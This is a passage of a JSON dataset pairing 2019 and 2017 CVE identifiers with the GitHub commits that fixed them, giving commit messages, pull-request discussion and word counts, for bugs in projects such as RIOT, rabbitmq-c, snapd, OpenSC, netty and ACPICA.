            "other_info": "Wip master chunkphase1 This supersedes PR #35 that I left for civetweb.  I'm guessing travis will fail again.  This is simplified to be just the \"safe\" fixes - I'll have further fixes past this that have more complicated issues. I had left out a commit originally and botched a refactor.  I've pushed corrections for both.",
            "pr_title_words": 3,
            "comments_words": 52,
            "total_other_info_words": 55
        },
        {
            "cve-id": "CVE-2019-15702",
            "commit_url": "https://github.com/RIOT-OS/RIOT/commit/9764697a3b21ea4c7c0d33ce4e3a83d2da620a1a",
            "commit_msg": "gnrc_tcp: abort on unknown option",
            "commit_msg_words": 5,
            "other_info": "gnrc_tcp: abort on unknown option Forgot to mention that I didn't read the RFC and just wanted to fix the issue. No idea what behaviour the RFC mandates. > Forgot to mention that I didn't read the RFC and just wanted to fix the issue. No idea what behaviour the RFC mandates.\r\n\r\nMe neither, but only thing that could be wrong, that the option should be ignored. If that is the case we can fix that later. It's more important to close a potential attack vector first.",
            "pr_title_words": 5,
            "comments_words": 82,
            "total_other_info_words": 87
        },
        {
            "cve-id": "CVE-2019-18609",
            "commit_url": "https://github.com/alanxz/rabbitmq-c/commit/fc85be7123050b91b054e45b91c78d3241a5047a",
            "commit_msg": "lib: check frame_size is >= INT32_MAX\n\nWhen parsing a frame header, validate that the frame_size is less than\nor equal to INT32_MAX. Given frame_max is limited between 0 and\nINT32_MAX in amqp_login and friends, this does not change the API.\n\nThis prevents a potential buffer overflow when a malicious client sends\na frame_size that is close to UINT32_MAX, in which causes an overflow\nwhen computing state->target_size resulting in a small value there. A\nbuffer is then allocated with the small amount, then memcopy copies the\nframe_size writing to memory beyond the end of the buffer.",
            "commit_msg_words": 95,
            "other_info": "lib: check frame_size is >= INT32_MAX",
            "pr_title_words": 6,
            "comments_words": 0,
            "total_other_info_words": 6
        },
        {
            "cve-id": "CVE-2019-11502",
            "commit_url": "https://github.com/snapcore/snapd/commit/bdbfeebef03245176ae0dc323392bb0522a339b1",
            "commit_msg": "cmd/snap-confine: chown private /tmp parent to root.root\n\nWhen snap-confine creates a private /tmp directory for a given snap it\nfirst creates a temporary directory in /tmp/ named after the snap, along\nwith a random name. Inside that directory it creates a /tmp directory\nwith permissions appropriate for a future /tmp, namely 1777.\n\nUp until recently the that directory was owned by the user who first\ninvoked snap-confine. Since the directory is reused by all the users on\nthe system this logic makes no sense.\n\nThis patch changes the related logic so that the private /tmp directory\nis owned by root, just like the real one.\n\nSigned-off-by: Zygmunt Krynicki <zygmunt.krynicki@canonical.com>",
            "commit_msg_words": 109,
            "other_info": "cmd/snap-confine: chown private /tmp to root.root NOTE: This is stacked on top of https://github.com/snapcore/snapd/pull/6560",
            "pr_title_words": 6,
            "comments_words": 8,
            "total_other_info_words": 14
        },
        {
            "cve-id": "CVE-2019-3832",
            "commit_url": "https://github.com/libsndfile/libsndfile/commit/7408c4c788ce047d4e652b60a04e7796bcd7267e",
            "commit_msg": "wav_write_header: don't read past the array end\n\nIf loop_count is bigger than the array, truncate it to the array\nlength (and not to 32k).\n\nCVE-2019-3832",
            "commit_msg_words": 25,
            "other_info": "wav_write_header: don't read past the array end",
            "pr_title_words": 7,
            "comments_words": 0,
            "total_other_info_words": 7
        },
        {
            "cve-id": "CVE-2019-1010065",
            "commit_url": "https://github.com/sleuthkit/sleuthkit/commit/114cd3d0aac8bd1aeaf4b33840feb0163d342d5b",
            "commit_msg": "hfs: fix keylen check in hfs_cat_traverse()\n\nIf key->key_len is 65535, calculating \"uint16_t keylen' would\ncause an overflow:\n\n   uint16_t keylen;\n   ...\n   keylen = 2 + tsk_getu16(hfs->fs_info.endian, key->key_len)\n\nso the code bypasses the sanity check \"if (keylen > nodesize)\"\nwhich results in crash later:\n\n    ./toolfs/fstools/fls -b 512 -f hfs <image>\n    =================================================================\n    ==16==ERROR: AddressSanitizer: SEGV on unknown address 0x6210000256a4 (pc 0x00000054812b bp 0x7ffca548a8f0 sp 0x7ffca548a480 T0)\n    ==16==The signal is caused by a READ memory access.\n        #0 0x54812a in hfs_dir_open_meta_cb /fuzzing/sleuthkit/tsk/fs/hfs_dent.c:237:20\n        #1 0x51a96c in hfs_cat_traverse /fuzzing/sleuthkit/tsk/fs/hfs.c:1082:21\n        #2 0x547785 in hfs_dir_open_meta /fuzzing/sleuthkit/tsk/fs/hfs_dent.c:480:9\n        #3 0x50f57d in tsk_fs_dir_open_meta /fuzzing/sleuthkit/tsk/fs/fs_dir.c:290:14\n        #4 0x54af17 in tsk_fs_path2inum /fuzzing/sleuthkit/tsk/fs/ifind_lib.c:237:23\n        #5 0x522266 in hfs_open /fuzzing/sleuthkit/tsk/fs/hfs.c:6579:9\n        #6 0x508e89 in main /fuzzing/sleuthkit/tools/fstools/fls.cpp:267:19\n        #7 0x7f9daf67c2b0 in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x202b0)\n        #8 0x41d679 in _start (/fuzzing/sleuthkit/tools/fstools/fls+0x41d679)\n\nMake 'keylen' int type to prevent the overflow and fix that.\nNow, I get proper error message instead of crash:\n    ./toolfs/fstools/fls -b 512 -f hfs <image>\n    General file system error (hfs_cat_traverse: length of key 3 in leaf node 1 too large (65537 vs 4096))",
            "commit_msg_words": 161,
            "other_info": "hfs: fix keylen check in hfs_cat_traverse()",
            "pr_title_words": 6,
            "comments_words": 0,
            "total_other_info_words": 6
        },
        {
            "cve-id": "CVE-2019-16058",
            "commit_url": "https://github.com/OpenSC/pam_p11/commit/d150b60e1e14c261b113f55681419ad1dfa8a76c",
            "commit_msg": "Use EVP_PKEY_size() to allocate correct size of signature buffer. (#18)\n\nDo not use fixed buffer size for signature, EVP_SignFinal() requires\r\nbuffer for signature at least  EVP_PKEY_size(pkey) bytes in size.\r\n\r\nFixes crash when using 4K RSA signatures (https://github.com/OpenSC/pam_p11/issues/16, https://github.com/OpenSC/pam_p11/issues/15)",
            "commit_msg_words": 38,
            "other_info": "Use EVP_PKEY_size() to allocate correct size of signature buffer. Thanks for comments, PR changed. I've edited the PR, please check if you think it's OK Looks good, but if we rely on openssl, there is enough to check  return value from `EVP_PKEY_size()` ..  test on `privkey` is not necesary. From openssl:\r\n\r\nint EVP_PKEY_size(const EVP_PKEY *pkey)\r\n{\r\n    if (pkey && pkey->ameth && pkey->ameth->pkey_size)\r\n        return pkey->ameth->pkey_size(pkey);\r\n    return 0;\r\n}\r\n\r\n\r\n\r\n\r\n I wonder if it would be better to write it without `malloc` i.e.:\r\n\r\nunsigned char signature[4096];\r\n\r\nif(EVP_PKEY_size(privkey)<= 0 || EVP_PKEY_size(privkey) > sizeof signature) goto err;\r\n\r\nFeel free to rewrite whole PR, if this solution is acceptable.",
            "pr_title_words": 9,
            "comments_words": 94,
            "total_other_info_words": 103
        },
        {
            "cve-id": "CVE-2019-12210",
            "commit_url": "https://github.com/Yubico/pam-u2f/commit/18b1914e32b74ff52000f10e97067e841e5fff62",
            "commit_msg": "Do not leak file descriptor when doing exec\n\nWhen opening a custom debug file, the descriptor would stay\nopen when calling exec and leak to the child process.\n\nMake sure all files are opened with close-on-exec.\n\nThis fixes CVE-2019-12210.\n\nThanks to Matthias Gerstner of the SUSE Security Team for reporting\nthe issue.",
            "commit_msg_words": 52,
            "other_info": "Fix debug file descriptor leak and insecure debug file handling",
            "pr_title_words": 10,
            "comments_words": 0,
            "total_other_info_words": 10
        },
        {
            "cve-id": "CVE-2019-5064",
            "commit_url": "https://github.com/opencv/opencv/commit/f42d5399aac80d371b17d689851406669c9b9111",
            "commit_msg": "core(persistence): add more checks for implementation limitations",
            "commit_msg_words": 7,
            "other_info": "core(persistence): add more checks for implementation limitations",
            "pr_title_words": 7,
            "comments_words": 0,
            "total_other_info_words": 7
        },
        {
            "cve-id": "CVE-2019-6502",
            "commit_url": "https://github.com/OpenSC/OpenSC/commit/0d7967549751b7032f22b437106b41444aff0ba9",
            "commit_msg": "Small memory leak fix (CVE-2019-6502 in #1586)\n\nCVE-2019-6502 was assigned to what appears to be a very minor\nmemory leak that only occurs on an error-case in a CLI tool.\nIf util_connect_card fails, we still need to release the sc\ncontext previously allocated by sc_context_create else memory\nwill leak.",
            "commit_msg_words": 49,
            "other_info": "Small memory leak fix (Fixes#1586 / CVE-2019-6502) please check the other tools as well. I suspect that some will contain the same problem. BTW, do you still call it a memory leak if it happens exactly when the program terminates (and the OS then frees all resources afterwards)? > \r\n> \r\n> BTW, do you still call it a memory leak if it happens exactly when the program terminates (and the OS then frees all resources afterwards)?\r\n\r\nGreat question. I think this answers it the best: http://c-faq.com/malloc/freeb4exit.html\r\n\r\nPresumably the only outcome of this fix is \"good practice\" and no one will (hopefully) report this specific Valgrind/ASAN error in the future. As stated in the ticket though, I don't think the CVE is necessarily valid for this issue as I don't see any way this could be exploited by an attacker to have any form of negative impact on availability, confidentiality, or integrity.",
            "pr_title_words": 7,
            "comments_words": 144,
            "total_other_info_words": 151
        },
        {
            "cve-id": "CVE-2019-25027",
            "commit_url": "https://github.com/vaadin/flow/commit/cde1389507aac2dc8aa6ae39296765c1ca457b69",
            "commit_msg": "Sanitize input used in error template\n\nAs error template is html, and the input used in it is taken from the path, which can be anything, the input needs to be sanitized before added to the template to avoid possible XSS injection.",
            "commit_msg_words": 42,
            "other_info": "Sanitize input used in error template [![CLA assistant check](https://cla-assistant.io/pull/badge/signed)](https://cla-assistant.io/vaadin/flow?pullRequest=5498) <br/>All committers have signed the CLA. [![CLA assistant check](https://cla-assistant.io/pull/badge/not_signed)](https://cla-assistant.io/vaadin/flow?pullRequest=5498) <br/>Thank you for your submission, we really appreciate it. Like many open source projects, we ask that you sign our [Contributor License Agreement](https://cla-assistant.io/vaadin/flow?pullRequest=5498) before we can accept your contribution.<br/><sub>You have signed the CLA already but the status is still pending? Let us [recheck](https://cla-assistant.io/check/vaadin/flow?pullRequest=5498) it.</sub>",
            "pr_title_words": 6,
            "comments_words": 56,
            "total_other_info_words": 62
        },
        {
            "cve-id": "CVE-2019-10686",
            "commit_url": "https://github.com/apolloconfig/apollo/commit/56919378154fc27c9fb62cbfa68ab2df0bcac003",
            "commit_msg": "Fix SSRF, resolve #2103",
            "commit_msg_words": 4,
            "other_info": "[APOLLO-2103] Fix SSRF # [Codecov](https://codecov.io/gh/ctripcorp/apollo/pull/2105?src=pr&el=h1) Report\n> Merging [#2105](https://codecov.io/gh/ctripcorp/apollo/pull/2105?src=pr&el=desc) into [master](https://codecov.io/gh/ctripcorp/apollo/commit/f50dc4e8af018c0f6db4e7f1103bd21ef947d8f9?src=pr&el=desc) will **decrease** coverage by `0.1%`.\n> The diff coverage is `0%`.\n\n[![Impacted file tree graph](https://codecov.io/gh/ctripcorp/apollo/pull/2105/graphs/tree.svg?width=650&token=2USkCxREbZ&height=150&src=pr)](https://codecov.io/gh/ctripcorp/apollo/pull/2105?src=pr&el=tree)\n\n```diff\n@@             Coverage Diff              @@\n##             master    #2105      +/-   ##\n============================================\n- Coverage     50.05%   49.95%   -0.11%     \n  Complexity     1981     1981              \n============================================\n  Files           401      401              \n  Lines         12384    12403      +19     \n  Branches       1268     1276       +8     \n============================================\n- Hits           6199     6196       -3     \n- Misses         5742     5763      +21     \n- Partials        443      444       +1\n```\n\n\n| [Impacted Files](https://codecov.io/gh/ctripcorp/apollo/pull/2105?src=pr&el=tree) | Coverage \u0394 | Complexity \u0394 | |\n|---|---|---|---|\n| [...apollo/portal/controller/SystemInfoController.java](https://codecov.io/gh/ctripcorp/apollo/pull/2105/diff?src=pr&el=tree#diff-YXBvbGxvLXBvcnRhbC9zcmMvbWFpbi9qYXZhL2NvbS9jdHJpcC9mcmFtZXdvcmsvYXBvbGxvL3BvcnRhbC9jb250cm9sbGVyL1N5c3RlbUluZm9Db250cm9sbGVyLmphdmE=) | `13.46% <0%> (-7.76%)` | `3 <0> (\u00f8)` | |\n| [...mework/apollo/portal/component/PortalSettings.java](https://codecov.io/gh/ctripcorp/apollo/pull/2105/diff?src=pr&el=tree#diff-YXBvbGxvLXBvcnRhbC9zcmMvbWFpbi9qYXZhL2NvbS9jdHJpcC9mcmFtZXdvcmsvYXBvbGxvL3BvcnRhbC9jb21wb25lbnQvUG9ydGFsU2V0dGluZ3MuamF2YQ==) | `65.07% <0%> (-4.77%)` | `5% <0%> (\u00f8)` | |\n\n------\n\n[Continue to review full report at Codecov](https://codecov.io/gh/ctripcorp/apollo/pull/2105?src=pr&el=continue).\n> **Legend** - [Click here to learn more](https://docs.codecov.io/docs/codecov-delta)\n> `\u0394 = absolute <relative> (impact)`, `\u00f8 = not affected`, `? = missing data`\n> Powered by [Codecov](https://codecov.io/gh/ctripcorp/apollo/pull/2105?src=pr&el=footer). Last update [f50dc4e...97ffde8](https://codecov.io/gh/ctripcorp/apollo/pull/2105?src=pr&el=lastupdated). Read the [comment docs](https://docs.codecov.io/docs/pull-request-comments).\n \n[![Coverage Status](https://coveralls.io/builds/22649316/badge)](https://coveralls.io/builds/22649316)\n\nCoverage decreased (-0.1%) to 53.535% when pulling **97ffde87e63de09864c48318010db7f0ea30fef1 on kezhenxu94:master** into **f50dc4e8af018c0f6db4e7f1103bd21ef947d8f9 on ctripcorp:master**.\n /health \u672a\u6388\u6743\u8bbf\u95ee\u6f0f\u6d1e \u89e3\u51b3\u4e86\u5417\uff1f\u5982\u679c\u5df2\u89e3\u51b3\uff0c\u54ea\u4e2a\u7248\u672c\u4e2d\u89e3\u51b3\u4e86\uff1f@[nobodyiam] @liutao5121 \r\n\r\nWhat do you mean by `/health \u672a\u6388\u6743\u8bbf\u95ee\u6f0f\u6d1e \u89e3\u51b3\u4e86\u5417\uff1f`?\r\nI believe `/health` doesn't expose any sensitive information, and it could be used by external platforms like Kubernetes readiness probe.\r\nBut if you really want to close this endpoint, you may simply configure it via the standard [spring boot way](https://docs.spring.io/spring-boot/docs/current/reference/html/actuator.html#actuator.endpoints.enabling).\r\nCurrently, apollo [exposes](https://github.com/apolloconfig/apollo/blob/master/apollo-common/src/main/resources/application.properties#L37) `info,health,metrics,prometheus` by default\r\n\r\n > \r\n\r\nI tried to resolve the unauthorized access vulnerability (/health) by turning off the health endpoint of the AdminService module, which caused no configuration information to be seen on the Apollo-Portal interface   ![image](https://user-images.githubusercontent.com/4645306/160746623-000b16c7-85e0-4de5-9500-72a081e60d2c.png)\r\n If the adminService module configuration \"management. Endpoints. Web. Exposure. Exclude = health\", the upper right corner of the portal page complains, don't see any configuration information  .....The picture above is my test results Right...I forgot the portal will ping admin-service's health endpoint to check whether it's healthy.\r\n\r\nhttps://github.com/apolloconfig/apollo/blob/d15331b25242c5a5d80118b139e7a27bb95076bb/apollo-portal/src/main/java/com/ctrip/framework/apollo/portal/api/AdminServiceAPI.java#L42-L44",
            "pr_title_words": 3,
            "comments_words": 303,
            "total_other_info_words": 306
        },
        {
            "cve-id": "CVE-2019-9144",
            "commit_url": "https://github.com/Exiv2/exiv2/commit/134e062b664e52a0f1e5223ea8c5d2495de2f31e",
            "commit_msg": "Fix issue 712.",
            "commit_msg_words": 3,
            "other_info": "Bound recursion depth to avoid stack exhaustion # [Codecov](https://codecov.io/gh/Exiv2/exiv2/pull/1091?src=pr&el=h1) Report\n> Merging [#1091](https://codecov.io/gh/Exiv2/exiv2/pull/1091?src=pr&el=desc) into [master](https://codecov.io/gh/Exiv2/exiv2/commit/99be597e00cc686a66299b9bd7dbfb1d3c343356?src=pr&el=desc) will **increase** coverage by `0.02%`.\n> The diff coverage is `33.33%`.\n\n[![Impacted file tree graph](https://codecov.io/gh/Exiv2/exiv2/pull/1091/graphs/tree.svg?width=650&token=O9G7Iswx26&height=150&src=pr)](https://codecov.io/gh/Exiv2/exiv2/pull/1091?src=pr&el=tree)\n\n```diff\n@@            Coverage Diff             @@\n##           master    #1091      +/-   ##\n==========================================\n+ Coverage   71.81%   71.83%   +0.02%     \n==========================================\n  Files         152      152              \n  Lines       17651    17654       +3     \n==========================================\n+ Hits        12676    12682       +6     \n+ Misses       4975     4972       -3\n```\n\n\n| [Impacted Files](https://codecov.io/gh/Exiv2/exiv2/pull/1091?src=pr&el=tree) | Coverage \u0394 | |\n|---|---|---|\n| [src/bigtiffimage.cpp](https://codecov.io/gh/Exiv2/exiv2/pull/1091/diff?src=pr&el=tree#diff-c3JjL2JpZ3RpZmZpbWFnZS5jcHA=) | `63.21% <33.33%> (+1.23%)` | :arrow_up: |\n| [src/pngimage.cpp](https://codecov.io/gh/Exiv2/exiv2/pull/1091/diff?src=pr&el=tree#diff-c3JjL3BuZ2ltYWdlLmNwcA==) | `77.81% <0%> (\u00f8)` | :arrow_up: |\n| [src/RemoteIo.cpp](https://codecov.io/gh/Exiv2/exiv2/pull/1091/diff?src=pr&el=tree#diff-c3JjL1JlbW90ZUlvLmNwcA==) | `0% <0%> (\u00f8)` | :arrow_up: |\n| [src/params.cpp](https://codecov.io/gh/Exiv2/exiv2/pull/1091/diff?src=pr&el=tree#diff-c3JjL3BhcmFtcy5jcHA=) | `72.17% <0%> (+0.31%)` | :arrow_up: |\n\n------\n\n[Continue to review full report at Codecov](https://codecov.io/gh/Exiv2/exiv2/pull/1091?src=pr&el=continue).\n> **Legend** - [Click here to learn more](https://docs.codecov.io/docs/codecov-delta)\n> `\u0394 = absolute <relative> (impact)`, `\u00f8 = not affected`, `? = missing data`\n> Powered by [Codecov](https://codecov.io/gh/Exiv2/exiv2/pull/1091?src=pr&el=footer). Last update [99be597...a6765cf](https://codecov.io/gh/Exiv2/exiv2/pull/1091?src=pr&el=lastupdated). Read the [comment docs](https://docs.codecov.io/docs/pull-request-comments).\n Fix submitted into 0.27-maintenance #1140",
            "pr_title_words": 7,
            "comments_words": 150,
            "total_other_info_words": 157
        },
        {
            "cve-id": "CVE-2019-16754",
            "commit_url": "https://github.com/RIOT-OS/RIOT/commit/30e4823e946949befe74ef94bc48fe43958c28a6",
            "commit_msg": "asymcute: don't make the assumption that req->arg is non-NULL\n\nThis fixes a denial of service where an attacker would be able to cause\na NULL pointer dereference by sending a spoofed packet. This attack only\nrequires knowledge about pending message ids.",
            "commit_msg_words": 41,
            "other_info": "asymcute: Fix null pointer dereference",
            "pr_title_words": 5,
            "comments_words": 0,
            "total_other_info_words": 5
        },
        {
            "cve-id": "CVE-2019-17498",
            "commit_url": "https://github.com/libssh2/libssh2/commit/dedcbd106f8e52d5586b0205bc7677e4c9868f9c",
            "commit_msg": "packet.c: improve message parsing (#402)\n\n* packet.c: improve parsing of packets\r\n\r\nfile: packet.c\r\n\r\nnotes:\r\nUse _libssh2_get_string API in SSH_MSG_DEBUG/SSH_MSG_DISCONNECT. Additional uint32 bounds check in SSH_MSG_GLOBAL_REQUEST.",
            "commit_msg_words": 25,
            "other_info": "packet.c: improve message parsing Looks like only after that commit it would be good to make new release (1.9.1?)\r\n\r\nIf may I ask on that ocation consider change tagging convention to use in tag only version because github automatically generatet tar balls are using `<repo_name>-<tag>` and by this tar like https://github.com/libssh2/libssh2/archive/libssh2-1.9.0.tar.gz has base directory `libssh2-libssh2-1.9.0/`. Hello,When I added this patch, the error was reported as follows:    Can you tell me the reason?\r\n\r\n15:05:53 DEBUG: packet.c: In function '_libssh2_packet_add':\r\n15:05:53 DEBUG: packet.c:473:36: error: storage size of 'buf' isn't known\r\n15:05:53 DEBUG:                   struct string_buf buf;\r\n15:05:53 DEBUG:                                     ^\r\n15:05:53 DEBUG: packet.c:526:36: error: storage size of 'buf' isn't known\r\n15:05:53 DEBUG:                   struct string_buf buf;",
            "pr_title_words": 4,
            "comments_words": 107,
            "total_other_info_words": 111
        },
        {
            "cve-id": "CVE-2019-12209",
            "commit_url": "https://github.com/Yubico/pam-u2f/commit/7db3386fcdb454e33a3ea30dcfb8e8960d4c3aa3",
            "commit_msg": "Drop privileges by default when opening user-related files\n\nThe module is typically executed as root and would sometimes\nopen files or follow symlinks that could be controlled from the\noutside.\n\nDrop privileges to the target user before opening any files.\n\nFixes CVE-2019-12209.\n\nThanks to Matthias Gerstner of the SUSE Security Team for reporting\nthe issue.",
            "commit_msg_words": 55,
            "other_info": "Fix debug file descriptor leak and insecure debug file handling",
            "pr_title_words": 10,
            "comments_words": 0,
            "total_other_info_words": 10
        },
        {
            "cve-id": "CVE-2019-15557",
            "commit_url": "https://github.com/xm-online/xm-uaa/commit/ffa9609c809c17e7a39ae1d92843c4463e3ca739",
            "commit_msg": "add assertTenantKeyValid",
            "commit_msg_words": 2,
            "other_info": "Feature/fix sql injection",
            "pr_title_words": 3,
            "comments_words": 0,
            "total_other_info_words": 3
        },
        {
            "cve-id": "CVE-2019-13566",
            "commit_url": "https://github.com/ros/ros_comm/commit/67ff8fa94c63b90379054fdaec42ce2e7a19ac08",
            "commit_msg": "fixing string check\n\nSigned-off-by: Daniel Wang <daniel.wang@canonical.com>",
            "commit_msg_words": 7,
            "other_info": "fixing string check String safety fixes are always welcome.",
            "pr_title_words": 3,
            "comments_words": 6,
            "total_other_info_words": 9
        },
        {
            "cve-id": "CVE-2019-16869",
            "commit_url": "https://github.com/netty/netty/commit/39cafcb05c99f2aa9fce7e6597664c9ed6a63a95",
            "commit_msg": "Correctly handle whitespaces in HTTP header names as defined by RFC7230#section-3.2.4 (#9585)\n\nMotivation:\r\n\r\nWhen parsing HTTP headers special care needs to be taken when a whitespace is detected in the header name.\r\n\r\nModifications:\r\n\r\n- Ignore whitespace when decoding response (just like before)\r\n- Throw exception when whitespace is detected during parsing\r\n- Add unit tests\r\n\r\nResult:\r\n\r\nFixes https://github.com/netty/netty/issues/9571",
            "commit_msg_words": 58,
            "other_info": "Correctly handle whitespaces in HTTP header names as defined by RFC72\u2026 @netty-bot test this please",
            "pr_title_words": 11,
            "comments_words": 4,
            "total_other_info_words": 15
        },
        {
            "cve-id": "CVE-2019-6283",
            "commit_url": "https://github.com/sass/libsass/commit/0f3d3f8df99af422af055c41d778ca9c5c60a0bb",
            "commit_msg": "Fix heap-buffer-overflow in prelexer.hpp:70\n\nFixes #2814",
            "commit_msg_words": 6,
            "other_info": "Fix heap-buffer-overflow in prelexer.hpp:70",
            "pr_title_words": 4,
            "comments_words": 0,
            "total_other_info_words": 4
        }
    ],
    "2017": [
        {
            "cve-id": "CVE-2017-9847",
            "commit_url": "https://github.com/arvidn/libtorrent/commit/ec30a5e9ec703afb8abefba757c6d401303b53db",
            "commit_msg": "fix out-of-bounds read in bdecode\n\nFixes #2099",
            "commit_msg_words": 7,
            "other_info": "fix out-of-bounds read in bdecode looks good. Although I would also like to make ``parse_integer`` not dereference the end iterator, as that's not really OK still actually, after looking a bit more at this, that ``parse_int`` function is used in two distinct ways. One to parse an integer from a well-known range, and one to parse until a delimiter. It should probably be two separate functions.",
            "pr_title_words": 5,
            "comments_words": 61,
            "total_other_info_words": 66
        },
        {
            "cve-id": "CVE-2017-3730",
            "commit_url": "https://github.com/openssl/openssl/commit/efbe126e3ebb9123ac9d058aa2bb044261342aaa",
            "commit_msg": "Fix missing NULL checks in CKE processing\n\nReviewed-by: Rich Salz <rsalz@openssl.org>",
            "commit_msg_words": 11,
            "other_info": "Open ssl 1 1 0 stable Fixed the above nits, and removed ifdefs for OPENSSL_NO_SERVERINFO.\n\nRegarding the FIXME in ssl_rsa.c: it would be possible to do extra checking for known types, like SignedCertificateTimestamps, but you could probably do that more easily than me.\n\nNote that OPENSSL_NO_TLSEXT doesn't actually compile (not the fault of this patch), and the 5878 authz code is still left in.  These things should probably change, I'd be happy to work on them after this gets in. \n Merged, with modifications.",
            "pr_title_words": 6,
            "comments_words": 77,
            "total_other_info_words": 83
        },
        {
            "cve-id": "CVE-2017-1000215",
            "commit_url": "https://github.com/xrootd/xrootd/commit/befa2e627a5a33a38c92db3e57c07d8246a24acf",
            "commit_msg": "secgsi: do not build/package libXrdSecgsiGMAPLDAP-4.so\n\nThe way the LDAP query is implemented may represent a security threat.\nAny related building and packaging reference is removed.\nThe code is left in place (for the time being) to remind its functionality\nin the case a sanitized version is required.",
            "commit_msg_words": 47,
            "other_info": "secgsi: do not build/package libXrdSecgsiGMAPLDAP-4.so",
            "pr_title_words": 5,
            "comments_words": 0,
            "total_other_info_words": 5
        },
        {
            "cve-id": "CVE-2017-7274",
            "commit_url": "https://github.com/radareorg/radare2/commit/7ab66cca5bbdf6cb2d69339ef4f513d95e532dbf",
            "commit_msg": "Fix #7152 - Null deref in cms",
            "commit_msg_words": 7,
            "other_info": "fixed null deref on cms (Fix #7152) Test: https://github.com/radare/radare2-regressions/pull/778 thanks, chck the correct commit message to autoclose issues for the next time. Ok, sorry for that",
            "pr_title_words": 7,
            "comments_words": 19,
            "total_other_info_words": 26
        },
        {
            "cve-id": "CVE-2017-18009",
            "commit_url": "https://github.com/opencv/opencv/commit/4ca89db22dea962690f31c1781bce5937ee91837",
            "commit_msg": "imgproc(hdr): fix bounds check in HdrDecoder::checkSignature()",
            "commit_msg_words": 6,
            "other_info": "imgproc(hdr): fix bounds check in HdrDecoder::checkSignature() :+1:",
            "pr_title_words": 6,
            "comments_words": 1,
            "total_other_info_words": 7
        },
        {
            "cve-id": "CVE-2017-11732",
            "commit_url": "https://github.com/libming/libming/commit/726c2768805c8c95e8ad8e5f09eddc5b16570365",
            "commit_msg": "Fix buffer overflow in dcputs (buffer missing \\0)\n\nThe dcputs function appends passed string at the end of the global\nstring buffer (dcstr), adapting the buffer's size if necessary.\n\nUnfortunately, the strsize variable which holds the global buffer's\nsize is initialized to 0 in dcinit(), which means that no place for\nthe \\0 character is reserved. Hence, whenever dcputs tries to strcat\na string to the global buffer, a byte may be missing leading to a\nheap buffer overflow.\n\nThis commit addresses this issue (CVE-2017-11732, closes #80).",
            "commit_msg_words": 87,
            "other_info": "Fix buffer overflow in dcputs (buffer missing \\0)",
            "pr_title_words": 8,
            "comments_words": 0,
            "total_other_info_words": 8
        },
        {
            "cve-id": "CVE-2017-13693",
            "commit_url": "https://github.com/acpica/acpica/commit/987a3b5cf7175916e2a4b6ea5b8e70f830dfe732",
            "commit_msg": "acpi: acpica: fix acpi operand cache leak in dswstate.c\n\nI found an ACPI cache leak in ACPI early termination and boot continuing case.\n\nWhen early termination occurs due to malicious ACPI table, Linux kernel\nterminates ACPI function and continues to boot process. While kernel terminates\nACPI function, kmem_cache_destroy() reports Acpi-Operand cache leak.\n\nBoot log of ACPI operand cache leak is as follows:\n>[    0.585957] ACPI: Added _OSI(Module Device)\n>[    0.587218] ACPI: Added _OSI(Processor Device)\n>[    0.588530] ACPI: Added _OSI(3.0 _SCP Extensions)\n>[    0.589790] ACPI: Added _OSI(Processor Aggregator Device)\n>[    0.591534] ACPI Error: Illegal I/O port address/length above 64K: C806E00000004002/0x2 (20170303/hwvalid-155)\n>[    0.594351] ACPI Exception: AE_LIMIT, Unable to initialize fixed events (20170303/evevent-88)\n>[    0.597858] ACPI: Unable to start the ACPI Interpreter\n>[    0.599162] ACPI Error: Could not remove SCI handler (20170303/evmisc-281)\n>[    0.601836] kmem_cache_destroy Acpi-Operand: Slab cache still has objects\n>[    0.603556] CPU: 0 PID: 1 Comm: swapper/0 Not tainted 4.12.0-rc5 #26\n>[    0.605159] Hardware name: innotek GmbH VirtualBox/VirtualBox, BIOS VirtualBox 12/01/2006\n>[    0.609177] Call Trace:\n>[    0.610063]  ? dump_stack+0x5c/0x81\n>[    0.611118]  ? kmem_cache_destroy+0x1aa/0x1c0\n>[    0.612632]  ? acpi_sleep_proc_init+0x27/0x27\n>[    0.613906]  ? acpi_os_delete_cache+0xa/0x10\n>[    0.617986]  ? acpi_ut_delete_caches+0x3f/0x7b\n>[    0.619293]  ? acpi_terminate+0xa/0x14\n>[    0.620394]  ? acpi_init+0x2af/0x34f\n>[    0.621616]  ? __class_create+0x4c/0x80\n>[    0.623412]  ? video_setup+0x7f/0x7f\n>[    0.624585]  ? acpi_sleep_proc_init+0x27/0x27\n>[    0.625861]  ? do_one_initcall+0x4e/0x1a0\n>[    0.627513]  ? kernel_init_freeable+0x19e/0x21f\n>[    0.628972]  ? rest_init+0x80/0x80\n>[    0.630043]  ? kernel_init+0xa/0x100\n>[    0.631084]  ? ret_from_fork+0x25/0x30\n>[    0.633343] vgaarb: loaded\n>[    0.635036] EDAC MC: Ver: 3.0.0\n>[    0.638601] PCI: Probing PCI hardware\n>[    0.639833] PCI host bridge to bus 0000:00\n>[    0.641031] pci_bus 0000:00: root bus resource [io  0x0000-0xffff]\n> ... Continue to boot and log is omitted ...\n\nI analyzed this memory leak in detail and found acpi_ds_obj_stack_pop_and_\ndelete() function miscalculated the top of the stack. acpi_ds_obj_stack_push()\nfunction uses walk_state->operand_index for start position of the top, but\nacpi_ds_obj_stack_pop_and_delete() function considers index 0 for it.\nTherefore, this causes acpi operand memory leak.\n\nThis cache leak causes a security threat because an old kernel (<= 4.9) shows\nmemory locations of kernel functions in stack dump. Some malicious users\ncould use this information to neutralize kernel ASLR.\n\nI made a patch to fix ACPI operand cache leak.\n\nSigned-off-by: Seunghun Han <kkamagui@gmail.com>",
            "commit_msg_words": 358,
